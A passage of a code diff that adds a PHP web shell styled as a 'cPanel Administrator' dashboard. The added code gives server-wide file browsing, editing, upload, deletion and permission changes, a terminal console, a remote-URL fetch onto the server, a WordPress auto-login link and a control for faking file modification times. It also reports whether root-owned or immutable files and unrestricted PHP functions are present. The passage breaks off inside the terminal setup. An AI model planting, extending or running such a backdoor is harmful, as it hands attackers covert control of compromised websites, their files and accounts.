+                                <kbd style="background:var(--cp-input-bg); padding:3px 6px; border-radius:4px; border:1px solid var(--cp-border);">Ctrl</kbd> + <kbd style="background:var(--cp-input-bg); padding:3px 6px; border-radius:4px; border:1px solid var(--cp-border);">S</kbd> Save &nbsp; | &nbsp;
+                                <kbd style="background:var(--cp-input-bg); padding:3px 6px; border-radius:4px; border:1px solid var(--cp-border);">Ctrl</kbd> + <kbd style="background:var(--cp-input-bg); padding:3px 6px; border-radius:4px; border:1px solid var(--cp-border);">F</kbd> Search
+                            </span>
+                            <button onclick="saveCodeMirror()" class="btn btn-primary"><i class="fas fa-save"></i> Save Changes</button>
+                            <a href="?p=files&dir=<?php echo urlencode($dir_b64); ?>" class="btn btn-secondary"><i class="fas fa-times"></i> Close</a>
+                        </div>
+                    </div>
+                    
+                    <div class="editor-details-panel">
+                        <div>
+                            <i class="fas fa-folder-open" style="color: #f39c12; margin-right: 8px; font-size: 16px;"></i> 
+                            <strong>Path:</strong> <?php echo htmlspecialchars($edit_mode); ?>
+                        </div>
+                        <div style="margin-left: auto;">
+                            <i class="fas fa-weight-hanging" style="color: #3498db; margin-right: 8px; font-size: 16px;"></i> 
+                            <strong>Size:</strong> <?php echo formatSize(filesize($edit_mode)); ?>
+                        </div>
+                        <div style="margin-left: 25px;">
+                            <i class="fas fa-shield-alt" style="color: #2ecc71; margin-right: 8px; font-size: 16px;"></i> 
+                            <strong>Chmod:</strong> <?php echo substr(sprintf('%o', fileperms($edit_mode)), -4); ?>
+                        </div>
+                    </div>
+                </div>
+                
+                <form id="edit_form" method="POST">
+                    <input type="hidden" name="action" value="edit_save">
+                    <input type="hidden" name="target" value="<?php echo base64_encode($edit_mode); ?>">
+                    <input type="hidden" name="current_dir" value="<?php echo base64_encode($dir); ?>">
+                    <input type="hidden" name="b64_content" id="b64_content">
+                    <div class="editor-container">
+                        <textarea id="editor_textarea"><?php echo htmlspecialchars(file_get_contents($edit_mode)); ?></textarea>
+                    </div>
+                </form>
+
+                <script>
+                    var ext = "<?php echo pathinfo($edit_mode, PATHINFO_EXTENSION); ?>".toLowerCase();
+                    var mode = "application/x-httpd-php";
+                    if(ext === 'js') mode = "javascript";
+                    if(ext === 'css') mode = "css";
+                    if(ext === 'html') mode = "htmlmixed";
+                    
+                    var editor = CodeMirror.fromTextArea(document.getElementById("editor_textarea"), {
+                        lineNumbers: true, mode: mode, theme: "monokai", matchBrackets: true,
+                        indentUnit: 4, indentWithTabs: true, extraKeys: {"Ctrl-F": "findPersistent"}
+                    });
+                    
+                    function saveCodeMirror() {
+                        const content = editor.getValue();
+                        document.getElementById('b64_content').value = btoa(unescape(encodeURIComponent(content)));
+                        document.getElementById('edit_form').submit();
+                    }
+                </script>
+
+            <?php elseif ($page === 'dashboard'): ?>
+                <div class="dashboard-container">
+                    <div class="dashboard-main">
+                        
+                        <div class="welcome-banner">
+                            <div class="welcome-title">Welcome to cPanel Administrator</div>
+                            <div class="welcome-sub">System is fully operational. Manage your files, databases, configurations, and security suites efficiently.</div>
+                        </div>
+
+                        <div class="top-stats-grid">
+                            <div class="stat-card">
+                                <span class="stat-card-title"><i class="fas fa-hdd"></i> Disk Usage</span>
+                                <span class="stat-card-val" id="live_disk_text">Loading...</span>
+                                <div class="progress-container"><div class="progress-bar" id="live_disk_bar" style="width: 0%;"></div></div>
+                            </div>
+                            <div class="stat-card">
+                                <span class="stat-card-title"><i class="fas fa-memory" style="color:#28a745;"></i> RAM Usage</span>
+                                <span class="stat-card-val" id="live_ram_text">Loading...</span>
+                                <div class="progress-container"><div class="progress-bar" id="live_ram_bar" style="width: 0%; background: #28a745;"></div></div>
+                            </div>
+                            <div class="stat-card">
+                                <span class="stat-card-title"><i class="fas fa-microchip" style="color:#ffc107;"></i> CPU Load</span>
+                                <span class="stat-card-val" id="live_cpu" style="font-size:28px;">Loading...</span>
+                                <div style="font-size:12px; color:#aaa; margin-top:-5px; font-weight:600;">System Average Load</div>
+                            </div>
+                        </div>
+
+                        <div class="cp-group">
+                            <div class="cp-group-header"><i class="fas fa-rocket"></i> QUICK ACTIONS & TOOLS</div>
+                            <div class="cp-grid" style="grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));">
+                                <a href="?p=files&dir=<?php echo urlencode(base64_encode($_SERVER['DOCUMENT_ROOT'])); ?>" class="cp-icon">
+                                    <i class="fas fa-globe" style="color:#2ecc71;"></i><span>Document Root</span>
+                                </a>
+                                <a href="javascript:void(0)" onclick="openTerminal()" class="cp-icon">
+                                    <i class="fas fa-terminal" style="color:var(--cp-text);"></i><span>Terminal CLI</span>
+                                </a>
+                                <a href="javascript:void(0)" onclick="openSearch()" class="cp-icon">
+                                    <i class="fas fa-search" style="color:#e74c3c;"></i><span>Global Search</span>
+                                </a>
+                                <a href="javascript:void(0)" onclick="openAppMenu()" class="cp-icon">
+                                    <i class="fas fa-layer-group" style="color:#f39c12;"></i><span>App Manager</span>
+                                </a>
+                                <a href="?administrator=true" target="_blank" class="cp-icon">
+                                    <i class="fab fa-wordpress" style="color: #0073aa;"></i><span>WP Auto Login</span>
+                                </a>
+                                <a href="javascript:void(0)" class="cp-icon">
+                                    <i class="fas fa-database" style="color:#3498db;"></i><span>SQL Manager</span>
+                                </a>
+                            </div>
+                        </div>
+
+                        <div class="dash-panel-container">
+                            <div class="dash-panel-box">
+                                <div class="dash-panel-header"><i class="fab fa-php" style="color:#8e44ad; font-size:20px;"></i> PHP Configuration</div>
+                                <div class="dash-panel-body">
+                                    <table class="env-table">
+                                        <tr>
+                                            <th>PHP Version</th>
+                                            <td><?php echo phpversion(); ?></td>
+                                        </tr>
+                                        <tr>
+                                            <th>Safe Mode</th>
+                                            <td><?php echo ini_get('safe_mode') ? '<span class="env-status warn">ON</span>' : '<span class="env-status ok">OFF</span>'; ?></td>
+                                        </tr>
+                                        <tr>
+                                            <th>cURL Support</th>
+                                            <td><?php echo function_exists('curl_version') ? '<span class="env-status ok">Enabled</span>' : '<span class="env-status warn">Disabled</span>'; ?></td>
+                                        </tr>
+                                        <tr>
+                                            <th>allow_url_fopen</th>
+                                            <td><?php echo ini_get('allow_url_fopen') ? '<span class="env-status ok">ON</span>' : '<span class="env-status warn">OFF</span>'; ?></td>
+                                        </tr>
+                                        <tr>
+                                            <th>Disabled Functions</th>
+                                            <td style="font-size:11px; word-break: break-all;">
+                                                <?php 
+                                                    $df = ini_get('disable_functions'); 
+                                                    echo $df ? htmlspecialchars(str_replace(',', ', ', $df)) : '<span class="env-status ok">NONE (Fully Unrestricted)</span>'; 
+                                                ?>
+                                            </td>
+                                        </tr>
+                                    </table>
+                                </div>
+                            </div>
+
+                            <div class="dash-panel-box">
+                                <div class="dash-panel-header"><i class="fas fa-server" style="color:var(--cp-blue); font-size:18px;"></i> Server Environment</div>
+                                <div class="dash-panel-body">
+                                    <table class="env-table">
+                                        <tr>
+                                            <th>Operating System</th>
+                                            <td><?php echo htmlspecialchars(php_uname('s') . ' ' . php_uname('r')); ?></td>
+                                        </tr>
+                                        <tr>
+                                            <th>Server Software</th>
+                                            <td><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE']); ?></td>
+                                        </tr>
+                                        <tr>
+                                            <th>System User</th>
+                                            <td><?php echo htmlspecialchars($sys_user); ?></td>
+                                        </tr>
+                                        <tr>
+                                            <th>Server IP</th>
+                                            <td><?php echo htmlspecialchars($sys_info['server_ip']); ?></td>
+                                        </tr>
+                                        <tr>
+                                            <th>Client IP</th>
+                                            <td><?php echo htmlspecialchars($sys_info['client_ip']); ?></td>
+                                        </tr>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                    
+                    <div class="dashboard-side">
+                        <div class="side-panel">
+                            <h3><i class="fas fa-shield-alt"></i> Security Status</h3>
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; padding-bottom:15px; border-bottom:1px solid var(--cp-border);">
+                                <span style="font-weight:600; color:var(--cp-text);">Document Root</span> 
+                                <span style="font-weight:700; background:<?php echo is_writable($_SERVER['DOCUMENT_ROOT']) ? 'rgba(40,167,69,0.1)' : 'rgba(220,53,69,0.1)'; ?>; color:<?php echo is_writable($_SERVER['DOCUMENT_ROOT']) ? '#28a745' : '#dc3545'; ?>; padding:4px 10px; border-radius:4px;"><?php echo is_writable($_SERVER['DOCUMENT_ROOT']) ? 'Writable' : 'Locked'; ?></span>
+                            </div>
+                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                <span style="font-weight:600; color:var(--cp-text);">Current Dir</span> 
+                                <span style="font-weight:700; background:<?php echo is_writable($dir) ? 'rgba(40,167,69,0.1)' : 'rgba(220,53,69,0.1)'; ?>; color:<?php echo is_writable($dir) ? '#28a745' : '#dc3545'; ?>; padding:4px 10px; border-radius:4px;"><?php echo is_writable($dir) ? 'Writable' : 'Locked'; ?></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <script>
+                    function fetchLiveStats() {
+                        const fd = new FormData(); fd.append('ajax_action', 'stats');
+                        fetch('', { method: 'POST', body: fd }).then(r => r.json()).then(data => {
+                            document.getElementById('live_disk_text').innerText = data.disk_text;
+                            document.getElementById('live_disk_bar').style.width = data.disk_pct + '%';
+                            document.getElementById('live_ram_text').innerText = data.ram_txt;
+                            if(data.ram_txt !== "N/A") {
+                                let match = data.ram_txt.match(/\((.*?)%\)/);
+                                if(match) document.getElementById('live_ram_bar').style.width = match[1] + '%';
+                            }
+                            document.getElementById('live_cpu').innerText = data.cpu_load;
+                        }).catch(e => {});
+                    }
+                    fetchLiveStats(); setInterval(fetchLiveStats, 3000); 
+                </script>
+
+            <?php else: ?>
+                <div class="fm-header-sticky">
+                    <div class="fm-toolbar">
+                        
+                        <div class="breadcrumb-wrapper">
+                            <div class="breadcrumb-locked">
+                                <a href="?p=files&dir=<?php echo urlencode(base64_encode($script_dir)); ?>" title="Home"><i class="fas fa-home" style="font-size: 16px;"></i></a>
+                                <span style="color: #bbb; margin: 0 10px;">/</span>
+                                <a href="?p=files&dir=<?php echo urlencode(base64_encode('/')); ?>" title="Root"><i class="fas fa-hdd" style="font-size: 16px; margin-right:5px;"></i> root</a>
+                            </div>
+                            <div class="breadcrumb-scroll" id="breadScroll">
+                                <?php
+                                    $path_parts = array_filter(explode('/', $dir));
+                                    $build_path = '';
+                                    foreach($path_parts as $part) {
+                                        $build_path .= '/' . $part;
+                                        echo "<span class='separator'>/</span>";
+                                        echo "<a href='?p=files&dir=" . urlencode(base64_encode($build_path)) . "'>" . htmlspecialchars($part) . "</a>";
+                                    }
+                                ?>
+                            </div>
+                        </div>
+                        <script> document.getElementById('breadScroll').scrollLeft = document.getElementById('breadScroll').scrollWidth; </script>
+                        
+                        <div class="fm-actions">
+                            <span style="font-size:12px; opacity:0.6; margin-right:15px; font-weight:600;"><kbd style="background:var(--cp-input-bg); padding:3px 6px; border-radius:4px; border:1px solid var(--cp-border);">Esc</kbd> Cancel Actions</span>
+                            <button class="btn btn-secondary" onclick="openSearch()"><i class="fas fa-search"></i> Global Search</button>
+                            <button class="btn btn-warning" onclick="document.getElementById('upload_panel').style.display='block'"><i class="fas fa-upload"></i> Upload</button>
+                            <button class="btn btn-success" style="display:none;" id="btnPasteGlobal" onclick="pasteClipboard('<?php echo $dir_b64; ?>')"><i class="fas fa-paste"></i> Paste Here</button>
+                            <button class="btn btn-danger" onclick="modalMassDelete()"><i class="fas fa-trash-alt"></i> Delete Selected</button>
+                        </div>
+                    </div>
+                    
+                    <div id="upload_panel" style="display: none; padding: 15px; background: var(--cp-table-header); border: 1px dashed var(--cp-border); border-radius:var(--rad); margin-top: 15px;">
+                        <form method="POST" enctype="multipart/form-data" style="display: flex; align-items: center; gap: 15px;">
+                            <input type="hidden" name="action" value="upload">
+                            <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($dir_b64); ?>">
+                            <input type="file" name="upload_file" required style="background: var(--cp-input-bg); border: 1px solid var(--cp-border); padding: 8px; border-radius: 4px; color: var(--cp-text);">
+                            <button type="submit" class="btn btn-primary"><i class="fas fa-cloud-upload-alt"></i> Upload Now</button>
+                            <button type="button" class="btn btn-secondary" onclick="document.getElementById('upload_panel').style.display='none'">Cancel</button>
+                        </form>
+                    </div>
+                </div>
+
+                <div class="fm-content">
+                    <form id="mass_action_form" method="POST">
+                        <input type="hidden" name="action" value="mass_delete">
+                        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($dir_b64); ?>">
+                        <table class="fm-table" style="margin-top: 20px;">
+                            <thead>
+                                <tr>
+                                    <th style="width: 40px; text-align: center;"><input type="checkbox" id="selectAll" onclick="toggleAll(this)" style="cursor:pointer; width:16px; height:16px;"></th>
+                                    <th>Name</th>
+                                    <th>Size</th>
+                                    <th>Permissions</th>
+                                    <th>Last Modified</th>
+                                    <th style="text-align: right;">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <?php
+                                if (is_readable($dir)) {
+                                    $items = @scandir($dir);
+                                    if ($items !== false) {
+                                        $folders = []; $files = [];
+                                        
+                                        if (dirname($dir) !== $dir && $dir !== '/') {
+                                            $parentB64 = base64_encode(dirname($dir));
+                                            echo "<tr style='background: var(--cp-table-hover); opacity: 0.8;'>
+                                                <td></td>
+                                                <td colspan='5'><a href='?p=files&dir=" . urlencode($parentB64) . "' style='color: var(--cp-blue); text-decoration: none; font-weight: bold; font-size: 14px;'><i class='fas fa-level-up-alt' style='margin-right:8px;'></i> Up One Level (..)</a></td>
+                                            </tr>";
+                                        }
+
+                                        foreach ($items as $item) {
+                                            if ($item === '.' || $item === '..') continue;
+                                            $fullPath = $dir . $item;
+                                            if (is_dir($fullPath)) { $folders[] = $item; } else { $files[] = $item; }
+                                        }
+                                        
+                                        natcasesort($folders); natcasesort($files);
+                                        $allItems = array_merge($folders, $files);
+
+                                        foreach ($allItems as $item) {
+                                            $fullPath = $dir . $item;
+                                            $is_dir = is_dir($fullPath);
+                                            $targetB64 = base64_encode($fullPath);
+                                            $itemRawEscaped = htmlspecialchars($item, ENT_QUOTES);
+                                            
+                                            $size = $is_dir ? '-' : formatSize(filesize($fullPath));
+                                            $perms = getPerms($fullPath);
+                                            $modTimeRaw = filemtime($fullPath);
+                                            $modTime = date("Y-m-d H:i:s", $modTimeRaw);
+                                            $ext = pathinfo($fullPath, PATHINFO_EXTENSION);
+                                            
+                                            $is_immutable = false;
+                                            if (function_exists('shell_exec') && !$is_dir && strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+                                                $lsattr = @shell_exec("lsattr " . escapeshellarg($fullPath) . " 2>/dev/null");
+                                                if ($lsattr && preg_match('/^[a-zA-Z-]*i[a-zA-Z-]*\s/', $lsattr)) { $is_immutable = true; }
+                                            }
+                                            $owner = function_exists('posix_getpwuid') ? @posix_getpwuid(@fileowner($fullPath))['name'] : @fileowner($fullPath);
+                                            $is_root = ($owner === 'root' || $owner === 0);
+                                            $perm_color = ($is_root || $is_immutable) ? '#dc3545' : '#28a745'; 
+
+                                            $file_url = '';
+                                            if (!$is_dir && strpos($fullPath, $doc_root) === 0) {
+                                                $rel = str_replace($doc_root, '', $fullPath);
+                                                $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
+                                                $file_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . str_replace('\\', '/', $rel);
+                                            }
+                                            
+                                            $icon = $is_dir ? '<i class="fas fa-folder" style="color: #ffca28; font-size: 18px; margin-right: 12px; vertical-align:middle;"></i>' : '<i class="fas fa-file-alt" style="color: #888; font-size: 18px; margin-right: 12px; vertical-align:middle;"></i>';
+                                            if (in_array(strtolower($ext), ['zip', 'tar', 'gz', 'rar'])) $icon = '<i class="fas fa-file-archive" style="color: #e74c3c; font-size: 18px; margin-right: 12px; vertical-align:middle;"></i>';
+                                            if (in_array(strtolower($ext), ['php', 'html', 'js', 'css', 'json', 'xml'])) $icon = '<i class="fas fa-file-code" style="color: #3498db; font-size: 18px; margin-right: 12px; vertical-align:middle;"></i>';
+                                            if (in_array(strtolower($ext), ['png', 'jpg', 'jpeg', 'gif', 'svg'])) $icon = '<i class="fas fa-file-image" style="color: #2ecc71; font-size: 18px; margin-right: 12px; vertical-align:middle;"></i>';
+
+                                            echo "<tr class='file-row'>";
+                                            echo "<td style='text-align: center;'><input type='checkbox' name='selected_files[]' value='{$targetB64}' class='item-checkbox' style='width:16px; height:16px; cursor:pointer;'></td>";
+                                            
+                                            if ($is_dir) {
+                                                echo "<td><a href='?p=files&dir=" . urlencode($targetB64) . "' style='color: var(--cp-text); text-decoration: none; font-weight: 600;'>{$icon}" . htmlspecialchars($item) . "</a></td>";
+                                            } else {
+                                                echo "<td><a href='?p=files&dir=" . urlencode($dir_b64) . "&edit=" . urlencode($targetB64) . "' style='color: var(--cp-text); text-decoration: none; font-weight: 600;'>{$icon}" . htmlspecialchars($item) . "</a></td>";
+                                            }
+                                            
+                                            echo "<td style='opacity: 0.8;'>{$size}</td>";
+                                            echo "<td><code style='background: var(--cp-table-header); padding: 4px 8px; border: 1px solid var(--cp-border); border-radius: 4px; color: {$perm_color}; font-weight: 700; cursor: pointer; transition:0.2s;' onclick=\"modalChmod('{$targetB64}', '" . substr(sprintf('%o', fileperms($fullPath)), -4) . "')\">{$perms}</code></td>";
+                                            echo "<td><a href='javascript:void(0)' class='action-links' style='color:var(--cp-text); opacity:0.8; text-decoration:none; padding:0;' onclick=\"modalAction('mod_time', '{$targetB64}', 'Edit Waktu Modifikasi:', '{$modTime}')\">{$modTime}</a></td>";
+                                            
+                                            echo "<td style='text-align: right; white-space: nowrap;' class='action-links'>";
+                                            
+                                            echo "<button type='button' onclick=\"modalAction('rename', '{$targetB64}', 'Rename to:', '{$itemRawEscaped}')\" class='text-action'>Rename</button>";
+                                            
+                                            if (!$is_dir && strtolower($ext) === 'zip') {
+                                                echo "<button type='button' onclick=\"submitExec('extract_zip', '{$targetB64}')\" class='text-action' style='color:#28a745;'>Unzip</button>";
+                                            }
+                                            
+                                            if (!$is_dir) {
+                                                echo "<a href='?dl={$targetB64}' class='text-action' style='color:#007bff;'>Download</a>";
+                                            }
+
+                                            echo "<button type='button' onclick=\"submitExec('zip', '{$targetB64}')\" class='text-action'>Zip</button>";
+
+                                            if (!$is_dir && $file_url !== '') {
+                                                echo "<a href='{$file_url}' target='_blank' class='text-action' title='View file in browser'>Link</a>";
+                                            }
+                                            
+                                            echo "<button type='button' onclick=\"submitExec('duplicate', '{$targetB64}')\" class='text-action'>Dup</button>";
+                                            echo "<button type='button' onclick=\"setClipboard('copy', '{$targetB64}', '{$itemRawEscaped}')\" class='text-action'>Copy</button>";
+                                            echo "<button type='button' onclick=\"setClipboard('cut', '{$targetB64}', '{$itemRawEscaped}')\" class='text-action'>Cut</button>";
+                                            echo "<button type='button' onclick=\"modalChmod('{$targetB64}', '" . substr(sprintf('%o', fileperms($fullPath)), -4) . "')\" class='text-action'>Perms</button>";
+                                            echo "<button type='button' onclick=\"modalConfirmDelete('{$targetB64}', '{$itemRawEscaped}')\" class='text-action danger'>Delete</button>";
+                                            
+                                            echo "</td></tr>";
+                                        }
+                                    }
+                                } else {
+                                    echo "<tr><td colspan='6' style='text-align: center; color: #dc3545; padding: 25px; font-weight:bold;'><i class='fas fa-exclamation-triangle'></i> Permission Denied to read contents.</td></tr>";
+                                }
+                                ?>
+                            </tbody>
+                        </table>
+                    </form>
+                </div>
+            <?php endif; ?>
+        </div>
+    </div>
+
+    <script>
+        // ---------------------------------
+        // Theme Toggle Logic
+        // ---------------------------------
+        function toggleTheme() {
+            const body = document.body;
+            const btnIcon = document.querySelector('#themeToggleBtn i');
+            const btnText = document.querySelector('#themeToggleBtn span');
+            
+            if (body.classList.contains('dark-theme')) {
+                body.classList.remove('dark-theme');
+                localStorage.setItem('cpanel_theme', 'light');
+                if(btnIcon && btnText) {
+                    btnIcon.className = 'fas fa-moon';
+                    btnText.innerText = 'Dark Mode';
+                }
+            } else {
+                body.classList.add('dark-theme');
+                localStorage.setItem('cpanel_theme', 'dark');
+                if(btnIcon && btnText) {
+                    btnIcon.className = 'fas fa-sun';
+                    btnText.innerText = 'Light Mode';
+                }
+            }
+        }
+
+        (function() {
+            const savedTheme = localStorage.getItem('cpanel_theme');
+            if (savedTheme === 'dark') {
+                document.body.classList.add('dark-theme');
+            }
+        })();
+
+        document.addEventListener('DOMContentLoaded', () => {
+            if (document.body.classList.contains('dark-theme')) {
+                const btnIcon = document.querySelector('#themeToggleBtn i');
+                const btnText = document.querySelector('#themeToggleBtn span');
+                if(btnIcon && btnText) {
+                    btnIcon.className = 'fas fa-sun';
+                    btnText.innerText = 'Light Mode';
+                }
+            }
+            checkClipboard();
+            renderSidebarBookmarks(); // Load bookmarks to sidebar on load
+            initFireParticles(); // Load particles
+        });
+
+        // ---------------------------------
+        // Global Keyboard Shortcuts
+        // ---------------------------------
+        document.addEventListener('keydown', function(e) {
+            // Esc: Close Modals
+            if (e.key === 'Escape') {
+                document.querySelectorAll('.modal-overlay').forEach(m => {
+                    m.style.display = 'none';
+                });
+            }
+            // Ctrl+S / Cmd+S: Save Editor
+            if ((e.ctrlKey || e.metaKey) && e.key === 's') {
+                if (document.getElementById('edit_form')) {
+                    e.preventDefault();
+                    saveCodeMirror();
+                }
+            }
+        });
+
+        // ---------------------------------
+        // Fire Particles Generation (Tuned to reach top)
+        // ---------------------------------
+        function initFireParticles() {
+            const fp = document.getElementById('fire-particles');
+            if(!fp) return;
+            for(let i = 0; i < 40; i++) {
+                let p = document.createElement('div');
+                p.className = 'fire-particle';
+                p.style.left = (Math.random() * 100) + '%';
+                p.style.width = p.style.height = (Math.random() * 8 + 4) + 'px';
+                p.style.animationDuration = (Math.random() * 5 + 3) + 's';
+                p.style.animationDelay = (Math.random() * 2) + 's';
+                fp.appendChild(p);
+            }
+        }
+
+        // ---------------------------------
+        // Custom Remote Fetch App
+        // ---------------------------------
+        function customRemoteFetch() {
+            let url = document.getElementById('custom_rf_url').value;
+            let name = document.getElementById('custom_rf_name').value;
+            if(url && name) {
+                submitExec('remote_fetch', btoa(unescape(encodeURIComponent(url))), name);
+            } else {
+                alert("Please provide both URL and Filename.");
+            }
+        }
+
+        // ---------------------------------
+        // Core Functionalities
+        // ---------------------------------
+        function toggleAll(source) {
+            let checkboxes = document.querySelectorAll('.item-checkbox');
+            for(var i=0, n=checkboxes.length;i<n;i++) { checkboxes[i].checked = source.checked; }
+        }
+
+        function submitExec(action, targetB64, newValue = '') {
+            document.getElementById('form_action').value = action;
+            document.getElementById('form_target').value = targetB64;
+            document.getElementById('form_new_value').value = btoa(unescape(encodeURIComponent(newValue)));
+            document.getElementById('action_form').submit();
+        }
+
+        function setClipboard(action, b64, name) {
+            localStorage.setItem('fm_clip_action', action);
+            localStorage.setItem('fm_clip_b64', b64);
+            localStorage.setItem('fm_clip_name', name);
+            checkClipboard();
+            
+            document.getElementById('cModalTitle').innerHTML = "<i class='fas fa-clipboard-check' style='color:#28a745;'></i> Success";
+            document.getElementById('cModalBody').innerHTML = `<b style="color:var(--cp-blue);">${name}</b> added to clipboard for ${action}.`;
+            document.getElementById('cModalFooter').style.display = 'none';
+            document.getElementById('cModal').style.display = 'flex';
+            setTimeout(() => { closeModal('cModal'); document.getElementById('cModalFooter').style.display = 'flex'; }, 1500);
+        }
+        
+        function checkClipboard() {
+            let action = localStorage.getItem('fm_clip_action');
+            let btn = document.getElementById('btnPasteGlobal');
+            if(btn && action) {
+                btn.style.display = 'inline-flex';
+                btn.innerHTML = `<i class='fas fa-paste'></i> Paste (${action})`;
+            }
+        }
+
+        function pasteClipboard(currentDirB64) {
+            let action = localStorage.getItem('fm_clip_action');
+            let srcB64 = localStorage.getItem('fm_clip_b64');
+            if(action && srcB64) {
+                document.getElementById('form_action').value = 'paste';
+                document.getElementById('form_target').value = srcB64;
+                document.getElementById('form_new_value').value = btoa(unescape(encodeURIComponent(action))); 
+                document.getElementById('form_current_dir').value = currentDirB64;
+                document.getElementById('action_form').submit();
+                if(action === 'cut') { localStorage.removeItem('fm_clip_b64'); localStorage.removeItem('fm_clip_action'); }
+            }
+        }
+
+        function closeModal(id) { 
+            let el = document.getElementById(id);
+            if(el) { el.style.display = 'none'; }
+        }
+        
+        function modalAction(action, targetB64, promptText, defaultValue = '') {
+            document.getElementById('cModalTitle').innerHTML = "<i class='fas fa-pen' style='color:var(--cp-blue);'></i> Action Required";
+            const html = `<p style="margin-top:0; font-weight:600;">${promptText}</p><input type="text" id="cModalInputText" class="text-input" value="${defaultValue}" autocomplete="off">`;
+            document.getElementById('cModalBody').innerHTML = html;
+            const btn = document.getElementById('cModalConfirmBtn');
+            btn.className = "btn btn-primary"; btn.innerText = "Apply Action";
+            btn.onclick = function() {
+                const val = document.getElementById('cModalInputText').value;
+                if(val.trim() !== '') submitExec(action, targetB64, val);
+            };
+            document.getElementById('cModal').style.display = 'flex';
+            setTimeout(() => document.getElementById('cModalInputText').focus(), 100);
+        }
+
+        function modalConfirmDelete(targetB64, nameRaw) {
+            document.getElementById('cModalTitle').innerHTML = "<i class='fas fa-exclamation-triangle' style='color:#dc3545;'></i> Confirm Deletion";
+            document.getElementById('cModalBody').innerHTML = `<p style="font-size:15px;">Are you sure you want to permanently delete:<br><br><b style="color:var(--cp-blue);">${nameRaw}</b></p>`;
+            const btn = document.getElementById('cModalConfirmBtn');
+            btn.className = "btn btn-danger"; btn.innerText = "Delete Permanently";
+            btn.onclick = function() { submitExec('delete', targetB64); };
+            document.getElementById('cModal').style.display = 'flex';
+        }
+
+        function modalMassDelete() {
+            const checked = document.querySelectorAll('.item-checkbox:checked');
+            if (checked.length === 0) return;
+            document.getElementById('cModalTitle').innerHTML = "<i class='fas fa-exclamation-triangle' style='color:#dc3545;'></i> Mass Delete";
+            document.getElementById('cModalBody').innerHTML = `<p style="font-size:15px;">Delete <b style="color:#dc3545;">${checked.length}</b> selected item(s) permanently?</p>`;
+            const btn = document.getElementById('cModalConfirmBtn');
+            btn.className = "btn btn-danger"; btn.innerText = "Delete All";
+            btn.onclick = function() { document.getElementById('mass_action_form').submit(); };
+            document.getElementById('cModal').style.display = 'flex';
+        }
+
+        function modalChmod(targetB64, currentPerm) {
+            document.getElementById('cModalTitle').innerHTML = "<i class='fas fa-key' style='color:var(--cp-blue);'></i> Change Permissions";
+            const html = `
+                <div class="chmod-dark-ui">
+                    <div class="chmod-grid">
+                        <div class="chmod-col"><span class="chmod-title">Owner</span>
+                            <label class="chmod-row"><input type="checkbox" id="co_r" onchange="calcChmod()"> Read</label>
+                            <label class="chmod-row"><input type="checkbox" id="co_w" onchange="calcChmod()"> Write</label>
+                            <label class="chmod-row"><input type="checkbox" id="co_x" onchange="calcChmod()"> Execute</label>
+                        </div>
+                        <div class="chmod-col"><span class="chmod-title">Group</span>
+                            <label class="chmod-row"><input type="checkbox" id="cg_r" onchange="calcChmod()"> Read</label>
+                            <label class="chmod-row"><input type="checkbox" id="cg_w" onchange="calcChmod()"> Write</label>
+                            <label class="chmod-row"><input type="checkbox" id="cg_x" onchange="calcChmod()"> Execute</label>
+                        </div>
+                        <div class="chmod-col"><span class="chmod-title">Public</span>
+                            <label class="chmod-row"><input type="checkbox" id="cp_r" onchange="calcChmod()"> Read</label>
+                            <label class="chmod-row"><input type="checkbox" id="cp_w" onchange="calcChmod()"> Write</label>
+                            <label class="chmod-row"><input type="checkbox" id="cp_x" onchange="calcChmod()"> Execute</label>
+                        </div>
+                    </div>
+                    <div class="chmod-bottom">
+                        <input type="text" id="chmod_octal" class="chmod-input" value="${currentPerm}" onkeyup="parseChmod()">
+                        <span style="color:#aaa;">Permission</span>
+                    </div>
+                </div>`;
+            document.getElementById('cModalBody').innerHTML = html;
+            const btn = document.getElementById('cModalConfirmBtn');
+            btn.className = "btn btn-primary"; btn.innerText = "Apply Permissions";
+            btn.onclick = function() { submitExec('chmod', targetB64, document.getElementById('chmod_octal').value); };
+            document.getElementById('cModal').style.display = 'flex';
+            parseChmod(); 
+        }
+
+        function calcChmod() {
+            let o = (document.getElementById('co_r').checked ? 4 : 0) + (document.getElementById('co_w').checked ? 2 : 0) + (document.getElementById('co_x').checked ? 1 : 0);
+            let g = (document.getElementById('cg_r').checked ? 4 : 0) + (document.getElementById('cg_w').checked ? 2 : 0) + (document.getElementById('cg_x').checked ? 1 : 0);
+            let p = (document.getElementById('cp_r').checked ? 4 : 0) + (document.getElementById('cp_w').checked ? 2 : 0) + (document.getElementById('cp_x').checked ? 1 : 0);
+            document.getElementById('chmod_octal').value = '0' + o + g + p;
+        }
+
+        function parseChmod() {
+            let val = document.getElementById('chmod_octal').value.replace(/[^0-7]/g, '');
+            if(val.length > 4) val = val.substring(val.length - 4);
+            let p = val.padStart(3, '0');
+            let o = parseInt(p.charAt(p.length - 3)); let g = parseInt(p.charAt(p.length - 2)); let u = parseInt(p.charAt(p.length - 1));
+            document.getElementById('co_r').checked = (o & 4); document.getElementById('co_w').checked = (o & 2); document.getElementById('co_x').checked = (o & 1);
+            document.getElementById('cg_r').checked = (g & 4); document.getElementById('cg_w').checked = (g & 2); document.getElementById('cg_x').checked = (g & 1);
+            document.getElementById('cp_r').checked = (u & 4); document.getElementById('cp_w').checked = (u & 2); document.getElementById('cp_x').checked = (u & 1);
+        }
+
+        function openAppMenu() {
+            document.getElementById('appMenuModal').style.display = 'flex';
+        }
+
+        let terminalInitialized = false;
+        function openTerminal() {
+            document.getElementById('termModal').style.display = 'flex';
+            if(!terminalInitialized) { initTerminal(); terminalInitialized = true; }
+            setTimeout(() => document.getElementById('term_input').focus(), 100);
+        }
+
+        function initTerminal() {
+            const tInput = document.getElementById('term_input');
+            const tOutput = document.getElementById('term_output');
